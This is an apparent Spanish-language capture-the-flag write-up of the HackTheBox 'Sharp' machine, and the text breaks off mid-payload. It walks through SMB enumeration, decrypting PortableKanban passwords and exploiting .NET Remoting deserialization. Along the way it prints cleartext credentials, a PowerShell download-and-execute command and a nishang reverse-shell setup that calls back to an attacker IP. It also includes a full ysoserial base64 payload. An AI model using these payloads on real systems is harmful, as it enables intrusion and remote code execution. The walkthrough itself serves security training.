Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -Pn   Evita que realice Host Discovery, como ping (P) y el DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p- --open -v -Pn -oG initScan 10. 10. 10. 219# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 219 ()  Status: UpHost: 10. 10. 10. 219 ()  Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8888/open/tcp//sun-answerbook///  Ignored State: filtered (65531)# Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 372. 21 secondsMuy bien, tenemos los siguientes servicios:       Puerto   Descripci√≥n         135   MSRPC: Permite enviar peticiones entre computadores sin necesidad de conocer/entender detalles de la red.        139   NetBIOS (SMB): Interfaz que permite enlazar sistemas operativos (servicios) de red con hardware.        445   SMB: Basicamente nos deja compartir archivos y directorios (otras cositas tambien) entre dispositivos de una red. (Info sobre los puertos 139 y 445)       8888   Sun Answerbook: A√∫n no lo sabemos bien.    Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 135,139,445,8888 -sC -sV -Pn 10. 10. 10. 219 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p 135,139,445,8888 -sC -sV -Pn -oN portScan 10. 10. 10. 219Nmap scan report for 10. 10. 10. 219Host is up (0. 19s latency). PORT   STATE SERVICE      VERSION135/tcp open msrpc       Microsoft Windows RPC139/tcp open netbios-ssn    Microsoft Windows netbios-ssn445/tcp open microsoft-ds?8888/tcp open storagecraft-image StorageCraft Image ManagerService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 9m09s| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-01-25T16:17:41|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112. 21 secondsTenemos:       Puerto   Servicio   Versi√≥n         135   MsRPC   O. o       139   NetBIOS   u. u       445   SMB   e. e       8888   StorageCraft   StorageCraft Image Manager   Listo, demosle e investiguemos m√°s sobre cada servicio. ‚Ä¶ Puerto 445 ‚åñ: Con rpcclient no logramos enumerar nada, tenemos acceso con credenciales nulas, pero no podemos ejecutar alguna acci√≥n (: Mediante crackmapexec podemos ver que sistema operativo est√° siendo ejecutado: ‚Äì¬ª crackmapexec smb 10. 10. 10. 219 -u '' -p '' SMB     10. 10. 10. 219  445  SHARP      [*] Windows 10. 0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB     10. 10. 10. 219  445  SHARP      [-] Sharp\: STATUS_ACCESS_DENIEDUsando smbmap obtenemos informaci√≥n sobre los archivos o directorios compartidos en la red (entre muchas m√°s cosas). ‚Äì¬ª smbmap -H 10. 10. 10. 219[+] IP: 10. 10. 10. 219:445    Name: unknown    Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share    dev                           NO ACCESS    IPC$                          NO ACCESS    Remote IPC    kanban                         READ ONLYOpa, obtenemos 2 directorios interesantes, dev y kanban, pero solo tenemos acceso a uno de ellos, intentemos enumerarlo:  Connect list a shared folder - hacktricks. xyz. ‚Äì¬ª smbclient //10. 10. 10. 219/kanban --no-passAnonymous login successfulTry  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Sat Nov 14 13:56:03 2020 . .                  D    0 Sat Nov 14 13:56:03 2020 CommandLine. dll           A  58368 Wed Feb 27 03:06:14 2013 CsvHelper. dll            A  141312 Wed Nov 8 08:52:18 2017 DotNetZip. dll            A  456704 Wed Jun 22 15:31:52 2016 Files                D    0 Sat Nov 14 13:57:59 2020 Itenso. Rtf. Converter. Html. dll    A  23040 Thu Nov 23 11:29:32 2017 Itenso. Rtf. Interpreter. dll     A  75776 Thu Nov 23 11:29:32 2017 Itenso. Rtf. Parser. dll        A  32768 Thu Nov 23 11:29:32 2017 Itenso. Sys. dll           A  19968 Thu Nov 23 11:29:32 2017 MsgReader. dll            A  376832 Thu Nov 23 11:29:32 2017 Ookii. Dialogs. dll          A  133296 Thu Jul 3 16:20:12 2014 pkb. zip               A 2558011 Thu Nov 12 15:04:59 2020 Plugins               D    0 Thu Nov 12 15:05:11 2020 PortableKanban. cfg         A   5819 Sat Nov 14 13:56:01 2020 PortableKanban. Data. dll       A  118184 Thu Jan 4 16:12:46 2018 PortableKanban. exe         A 1878440 Thu Jan 4 16:12:44 2018 PortableKanban. Extensions. dll    A  31144 Thu Jan 4 16:12:50 2018 PortableKanban. pk3         A   2080 Sat Nov 14 13:56:01 2020 PortableKanban. pk3. bak       A   2080 Sat Nov 14 13:55:54 2020 PortableKanban. pk3. md5       A    34 Sat Nov 14 13:56:03 2020 ServiceStack. Common. dll       A  413184 Wed Sep 6 06:18:22 2017 ServiceStack. Interfaces. dll     A  137216 Wed Sep 6 06:17:30 2017 ServiceStack. Redis. dll       A  292352 Wed Sep 6 06:02:24 2017 ServiceStack. Text. dll        A  411648 Tue Sep 5 22:38:18 2017 User Guide. pdf           A 1050092 Thu Jan 4 16:14:28 2018        10357247 blocks of size 4096. 7943298 blocks availablesmb: \&gt; Tenemos varios archivos, pero estar enumerando de a uno en esa sesi√≥n no me gusta, podemos intentar dos cosas: hacernos una montura de ese directorio o descargarnos los archivos, vamos a descargarlos :P Podemos usar smbget para esta tarea, aunque existen varias formas (: ‚Äì¬ª smbget -R smb://10. 10. 10. 219/kanban -U ''Password for [] connecting to //kanban/10. 10. 10. 219: Using workgroup WORKGROUP, guest usersmb://10. 10. 10. 219/kanban/CommandLine. dllsmb://10. 10. 10. 219/kanban/CsvHelper. dllsmb://10. 10. 10. 219/kanban/DotNetZip. dllsmb://10. 10. 10. 219/kanban/Itenso. Rtf. Converter. Html. dllsmb://10. 10. 10. 219/kanban/Itenso. Rtf. Interpreter. dllsmb://10. 10. 10. 219/kanban/Itenso. Rtf. Parser. dllsmb://10. 10. 10. 219/kanban/Itenso. Sys. dllsmb://10. 10. 10. 219/kanban/MsgReader. dllsmb://10. 10. 10. 219/kanban/Ookii. Dialogs. dllsmb://10. 10. 10. 219/kanban/pkb. zipsmb://10. 10. 10. 219/kanban/Plugins/PluginsLibrary. dllsmb://10. 10. 10. 219/kanban/PortableKanban. cfgsmb://10. 10. 10. 219/kanban/PortableKanban. Data. dllsmb://10. 10. 10. 219/kanban/PortableKanban. exesmb://10. 10. 10. 219/kanban/PortableKanban. Extensions. dllsmb://10. 10. 10. 219/kanban/PortableKanban. pk3smb://10. 10. 10. 219/kanban/PortableKanban. pk3. baksmb://10. 10. 10. 219/kanban/PortableKanban. pk3. md5smb://10. 10. 10. 219/kanban/ServiceStack. Common. dllsmb://10. 10. 10. 219/kanban/ServiceStack. Interfaces. dllsmb://10. 10. 10. 219/kanban/ServiceStack. Redis. dllsmb://10. 10. 10. 219/kanban/ServiceStack. Text. dllsmb://10. 10. 10. 219/kanban/User Guide. pdfDownloaded 7,90MB in 62 seconds Listo, as√≠ nos queda m√°s f√°cil manipular los objetos, ahora, a enumerar y ver si hay algo interesante‚Ä¶ Si usamos la herramienta strings para ver cadenas de texto entendibles dentro de los binarios, hacia el objeto PortableKanban. pk3 obtenemos esto: ‚Äì¬ª strings PortableKanban. pk3{ Columns :[{ Id : 4757781032fd41b2a4511822e2c08850 , SortOrder :0, Name : Demo , Limit :0, TaskOrder :{ SortType : None , Parameters :[{ Field : Completed , SortOrder : Descending },{ Field : Deadline , SortOrder : Ascending },{ Field : Priority , SortOrder : Descending },{ Field : Topic , SortOrder : Ascending },{ Field : Person , SortOrder : Ascending }]}, AutoComplete :false, ResetCompleted :false, TimeStamp :637409769443121006}], Tasks :[{ Id : 33870d6dfe4146718ba0b2c9f7bc05cf , SeriesId : 00000000000000000000000000000000 , SortOrder : oGdBKcFw , ColumnId : 4757781032fd41b2a4511822e2c08850 , TopicId : 00000000000000000000000000000000 , PersonId : 00000000000000000000000000000000 , Text : New Task , Priority : Low , Created : \/Date(1605380100000+0100)\/ , CreatedBy : e8e29158d70d44b1a1ba4949d52790a0 , Modified : \/Date(-62135596800000)\/ , ModifiedBy : 00000000000000000000000000000000 , Deadline : \/Date(1605308400000+0100)\/ , HasDeadline :false, Completed : \/Date(1605308400000+0100)\/ , CompletedBy : 00000000000000000000000000000000 , Done :false, Canceled :false, Link :  , Subtasks :[], Tags :[], Estimate :0, Progress :0, Points :0, Comments :[], CustomFields :{}, TimeStamp :637409769542424146}], TimeTracks :[], Persons :[], Topics :[], Tags :[], Views :[], Users :[{ Id : e8e29158d70d44b1a1ba4949d52790a0 , Name : Administrator , Initials :  , Email :  , EncryptedPassword : k+iUoOvQYG98PuhhRC7/rg== , Role : Admin , Inactive :false, TimeStamp :637409769245503731},{ Id : 0628ae1de5234b81ae65c246dd2b4a21 , Name : lars , Initials :  , Email :  , EncryptedPassword : Ua3LyPFM175GN8D3+tqwLA== , Role : User , Inactive :false, TimeStamp :637409769265925613}], ServiceMessages :[], CustomFieldDescriptors :[], MetaData :{ Id : ffffffffffffffffffffffffffffffff , SchemaVersion : 4. 2. 0. 0 , SchemaVersionModified : \/Date(1605380100000+0100)\/ , SchemaVersionModifiedBy : e8e29158d70d44b1a1ba4949d52790a0 , SchemaVersionChecked : \/Date(-62135596800000-0000)\/ , SchemaVersionCheckedBy : 00000000000000000000000000000000 , TimeStamp :637409769001918463}}Podemos apoyarnos de la herramienta jq para que nos lo pase a formato json: ‚Äì¬ª strings PortableKanban. pk3 | jq. . .  . . .     TimeStamp : 637409769542424200  } ],  TimeTracks : [],  Persons : [],  Topics : [],  Tags : [],  Views : [],  Users : [  {    Id :  e8e29158d70d44b1a1ba4949d52790a0 ,    Name :  Administrator ,    Initials :   ,    Email :   ,    EncryptedPassword :  k+iUoOvQYG98PuhhRC7/rg== ,    Role :  Admin ,    Inactive : false,    TimeStamp : 637409769245503700  },  {    Id :  0628ae1de5234b81ae65c246dd2b4a21 ,    Name :  lars ,    Initials :   ,    Email :   ,    EncryptedPassword :  Ua3LyPFM175GN8D3+tqwLA== ,    Role :  User ,    Inactive : false,    TimeStamp : 637409769265925600  } ],  ServiceMessages : [], . . .  . . .  }}‚Ä¶ Explotaci√≥n #: Al final vemos un apartado llamado usuarios en el que est√°n listados:  Administrator : k+iUoOvQYG98PuhhRC7/rg== lars : Ua3LyPFM175GN8D3+tqwLA==La encriptaci√≥n ta rara y buscando no encontramos nada sobre ella‚Ä¶ Pero despu√©s de un tiempo estancado sin buscar lo realmente necesario, encontr√© un exploit muy reciente (por lo tanto tuve mucha suerte) que extrae las contrase√±as y las desencripta:  https://www. exploit-db. com/exploits/49409. Lo ejecutamos simplemente pas√°ndole el archivo PortableKanban. pk3: ‚Äì¬ª python3 portable_kanban_encrypted. py PortableKanban. pk3Administrator:G2@$btRSHJYTarglars:G123HHrth234gRGLindo lindo, obtenemos al menos algo diferente a lo anterior. Si validamos de nuevo con smbmap tenemos: ‚Äì¬ª smbmap -H 10. 10. 10. 219 -u 'lars' -p 'G123HHrth234gRG'[+] IP: 10. 10. 10. 219:445    Name: unknown                          Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share    dev                           READ ONLY    IPC$                          READ ONLY    Remote IPC    kanban                         NO ACCESSNice son v√°lidas y tenemos acceso a uno de los directorios interesantes: dev, las credenciales del usuario Administrator no funcionan :P Me puse a buscar como hubiera sido la desencriptaci√≥n sin el exploit reciente, pero no encontr√© alg√∫n camino. Me quedo con la duda, al finalizar indagar√© m√°s (: sigamos. Enumeramos con smbclient sobre el nuevo recurso: ‚Äì¬ª smbclient //10. 10. 10. 219/dev -U 'lars' Enter WORKGROUP\lars's password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Sun Nov 15 06:30:13 2020 . .                  D    0 Sun Nov 15 06:30:13 2020 Client. exe             A   5632 Sun Nov 15 05:25:01 2020 notes. txt              A    70 Sun Nov 15 08:59:02 2020 RemotingLibrary. dll         A   4096 Sun Nov 15 05:25:01 2020 Server. exe             A   6144 Mon Nov 16 06:55:44 2020        10357247 blocks of size 4096. 7941868 blocks availablesmb: \&gt; Y procedemos tambien a descargarlos: ‚Äì¬ª smbget -R smb://10. 10. 10. 219/dev -U 'lars'Password for [lars] connecting to //dev/10. 10. 10. 219: Using workgroup WORKGROUP, user larssmb://10. 10. 10. 219/dev/Client. exesmb://10. 10. 10. 219/dev/notes. txtsmb://10. 10. 10. 219/dev/RemotingLibrary. dllsmb://10. 10. 10. 219/dev/Server. exeDownloaded 15,57kB in 18 secondsTengo un problema con wine (que nos permite ejecutar programas basados en Windows sobre Linux), as√≠ que usaremos una m√°quina virtual con Windows para jugar con los binarios. Buscando por internet: remoting library exploit, encontramos un gran art√≠culo que aborda mucho sobre el tema, adem√°s nos habla de dnSpy, un debugger y decompilador de binarios . exe.  Incre√≠ble articulo sobre . Net Remoting for Hackers.  Info sobre . Net Remoting. Si abrimos los archivos, tenemos: ¬¨ Server. exe:  La conexi√≥n se generar√° sobre el puerto 8888.  Crea un canal de comunicaci√≥n (servicio), configurando el nombre de la aplicaci√≥n como: SecretSharpDebugApplicationEndpoint.  Mientras se tenga la conexi√≥n establecida, se mostrara Registered service. ¬¨ Client. exe:  Abre una petici√≥n hacia: tcp://localhost:8888/SecretSharpDebugApplicationEndpoint.      (Entonces sabemos que el puerto 8888 de la m√°quina se vuelve importante)    Se autentica con: debug:SharpApplicationDebugUserPassword123!. Ejecutemos los programas: C:\htb_sharp\files&gt;Server. exeRegistered serviceC:\htb_sharp\files&gt;netstat -aConexiones activas Proto Direcci√≥n local    Direcci√≥n remota    Estado . . .  TCP  0. 0. 0. 0:8888      WIN:0         LISTENING . . . Sip, tal como esper√°bamos. C:\htb_sharp\files&gt;Client. exeC:\htb_sharp\files&gt;No obtenemos nada, pero asumimos que hizo la conexi√≥n y pues termino :P ‚Ä¶ Pues empecemos a ver como podemos explotar esta locura‚Ä¶ (Entender el tiempo es tiempo perdido u. u) Despu√©s de un rato, encontramos un repositorio que se aprovecha de estos servicios y nos permite entre muchas cosas, aprovecharnos de la siempre peligrosa deserializaci√≥n insegura‚Ä¶  github. com/tyranid/ExploitRemotingService.  Articulo de tyranid sobre el uso del exploit.  Encontramos la descripci√≥n de la vulnerabilidad - . NET HTTP Remoting public exposed.  The technology depends on SoapFormater serialization mechanism which is vulnerable to deserialization attack by default. Acunetix Info r√°pida sobre deserializaci√≥n:  What is deserialization?.  Insecure deserialization.  C# Sharp deserialization. Entonces, clonamos el repo y nos apoyamos de Visual Studio 2019 para compilar todo el proyecto. Abrimos el archivo ExploitRemotingService. sln, pueda que les pida un paquete de desarrollador (o no) as√≠ que simplemente le dan a la opci√≥n de descargar, lo descargan y vuelven a abrir el proyecto. (Pues eso tuve que hacer yo :P). Ahora si compilan y se nos crea el ejecutable en la ruta: C:\htb_sharp\files\ExploitRemotingService\ExploitRemotingService\bin\Debug, ve√°moslo: PS C:\htb_sharp\files&gt; . \ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService. exe Perfecto, de los que nos pide tenemos:  URI: tcp://10. 10. 10. 219:8888/SecretSharpDebugApplicationEndpoint.  ‚Äìuser: debug.  ‚Äìpass: SharpApplicationDebugUserPassword123!. Asi que su ejecuci√≥n debe ser: PS C:\htb_sharp\files&gt; . \ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService. exe tcp://10. 10. 10. 219:8888/SecretSharpDebugApplicationEndpoint -s --user=debug --pass= SharpApplicationDebugUserPassword123!  verError, couldn't detect version, using host: 4. 0. 30319. 42000Detected version 4 server. . . Server stack trace:. . . Pero obtenemos bastantes errores locochones (aunque nos respondi√≥ con una versi√≥n), jmmm‚Ä¶ Leyendo que m√°s podemos hacer con el exploit, vemos la opci√≥n de enviar un objeto serializado haciendo uso del par√°metro raw. Pero como generamos ese objeto? Bueno, buscando tenemos la herramienta ysoserial, la cual como su descripci√≥n indica, explota aplicaciones que efect√∫an deserializacion insegura de objetos. Adem√°s tenemos el repositorio ysoserial. net que nos ayudara a hacer el proceso con un ejecutable de Windows:  github. com/pwntester/ysoserial. net. Hacemos el mismo proceso que antes, abrimos el archivo ysoserial. sln, compilamos y tenemos el binario: PS C:\htb_sharp\files&gt; . \ysoserial. net\ysoserial\bin\Debug\ysoserial. exe‚Ä¶ ‚Ä¶ Entonces, generemos el objeto, ysoserial tiene varios gadgets y plugins, usaremos el gadget llamado TypeConfuseDelegate: (*) TypeConfuseDelegate    Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializerHaremos que el formato sea BinaryFormatter, guardaremos el output en formato base64 y finalmente ingresaremos los comandos que queremos ejecutar en el proceso de deserializacion, todo quedar√≠a as√≠: PS C:\htb_sharp\files&gt; . \ysoserial. net\ysoserial\bin\Debug\ysoserial. exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c  powershell -c IEX(New-Object Net. WebClient). downloadString('http://10. 10. 14. 34:8000/P. ps1')  Esto nos generara una cadena en base64 que sera nuestro payload y sera el que adjuntemos al paramentro raw de ExploitRemotingService. Donde P. ps1 es el archivo Invoke-PowerShellTcp. ps1 del repositorio nishang, el cual nos brinda un mont√≥n de herramientas basadas en PowerShell. En nuestro caso y en el de ese archivo, nos permite indicarle que genere una reverse Shell, para esto debemos modificar una l√≠nea: function Invoke-PowerShellTcp { &lt;#. SYNOPSISNishang script which can be used for Reverse or Bind interactive PowerShell from a target. . DESCRIPTIONThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port. The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy. PARAMETER IPAddressThe IP address to connect to when using the -Reverse switch. . PARAMETER PortThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens. . EXAMPLEPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192. 168. 254. 226 -Port 4444. . . Tomamos la ultima linea y la agregamos al final del archivo pero sin el PS &gt; y la modificamos con nuestra IP y puerto: . . .   }}Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 14. 34 -Port 4433Entonces lo que har√° esto es muy sencillo, una vez estemos en escucha donde tengamos este archivo lanzamos el payload el cual claramente tambi√©n estar√° apuntando a este archivo. Una vez se reciba la petici√≥n el servidor leer√° toooooodo el archivo y como la √∫ltima l√≠nea est√° en forma de instrucci√≥n, el sistema la ejecutara, lo que quiere decir que ejecutara nuestra reverse Shell hacia el puerto 4433. D√©mosle‚Ä¶ Breveeeees e. e Pong√°monos primero en escucha por el puerto 4433: PS C:\htb_sharp\files&gt; . \nc. exe -lvp 4433listening on [any] 4433 . . . Ahora creemos el servidor web donde esta nuestro archivo P. ps1: PS C:\htb_sharp\files&gt; dir  Directorio: C:\htb_sharp\filesMode        LastWriteTime     Length Name----        -------------     ------ ----d-----  08/02/2021 10:52 a. m.         ExploitRemotingServiced-----  08/02/2021 01:30 p. m.         nishangd-----  08/02/2021 12:21 p. m.         ysoserial. net-a----  26/01/2021 11:07 a. m.      5632 Client. exe-a----  08/02/2021 01:34 p. m.      4533 P. ps1-a----  26/01/2021 11:07 a. m.      4096 RemotingLibrary. dll-a----  26/01/2021 11:07 a. m.      6144 Server. exePS C:\htb_sharp\files&gt; c:reteteteu_u\Python\Python39\python. exe -m http. serverServing HTTP on :: port 8000 (http://[::]:8000/) . . . Perfecto, ahora solo nos quedar√≠a ejecutar el payload, generemos la cadena en base64 con ysoserial:  Asegurense de desactivar todo lo que implique firewall, tuve algunos problemas por eso :P PS C:\htb_sharp\files&gt; . \ysoserial. net\ysoserial\bin\Debug\ysoserial. exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c  powershell -c IEX(New-Object Net. WebClient). downloadString('http://10. 10. 14. 34:8000/P. ps1') AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=Y ahora ExploitRemotingService: PS C:\htb_sharp\files&gt; . \ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService. exe tcp://10. 10. 10. 219:8888/SecretSharpDebugApplicationEndpoint -s --user= debug  --pass= SharpApplicationDebugUserPassword123!  raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFb